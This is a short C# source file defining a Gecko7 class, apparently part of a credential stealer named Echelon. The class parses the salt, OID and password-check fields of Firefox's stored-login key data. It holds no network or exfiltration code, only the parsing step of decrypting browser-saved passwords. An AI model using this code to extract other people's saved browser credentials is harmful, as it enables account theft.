using System.Globalization;

namespace Echelon
{
	public class Gecko7
	{
        public Gecko7(string DataToParse)
		{
			var num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			EntrySalt = DataToParse.Substring(6, num);
			var num2 = DataToParse.Length - (6 + num + 36);
			OID = DataToParse.Substring(6 + num + 36, num2);
			Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}

        public string EntrySalt
		{
			get;
		}

        public string OID
		{
			get;
		}

        public string Passwordcheck
		{
			get;
		}
    }
}
